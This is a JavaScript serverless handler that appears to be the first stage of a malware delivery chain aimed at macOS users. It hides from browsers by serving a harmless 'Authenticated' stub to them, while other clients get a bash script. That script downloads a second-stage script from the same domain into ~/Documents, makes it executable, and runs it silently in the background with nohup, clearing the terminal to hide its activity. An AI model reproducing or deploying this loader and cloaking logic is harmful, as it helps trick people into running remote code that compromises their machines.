// api/task/mac.js
// STEP 1 — macOS
// Issues a step-1 JWT and returns a bootstrap shell script that fetches /tokenlinux with both tokens.

export const config = { runtime: 'edge' };

import {
  getIp, isBrowser, isIpBlocked, blockAndRespond,
  createStepToken, genSessionId,
  getHost, urlParams, CORS, plainHeaders,
} from './_lib.js';

export default async function handler(req) {
  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 200, headers: CORS });
  }

  const ip         = getIp(req);
  const params     = urlParams(req);
  const origToken  = params.get('token') || '';

  if (await isIpBlocked(ip)) {
    console.log('[mac] BLOCKED:', ip);
    return new Response('Access permanently suspended.', { status: 403, headers: CORS });
  }

  const sessionId = genSessionId();
  const st1       = await createStepToken(ip, sessionId, 1, origToken);

  // Browser visit — return a benign plain-text stub
  if (isBrowser(req)) {
    return new Response('@echo off\necho Authenticated', {
      status: 200, headers: plainHeaders(),
    });
  }

  const domain = getHost(req);
  const script = `#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/Documents"
clear
curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/api/task/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
clear
chmod +x "$HOME/Documents/tokenlinux.sh"
clear
nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
`;

  return new Response(script, { status: 200, headers: plainHeaders() });
}
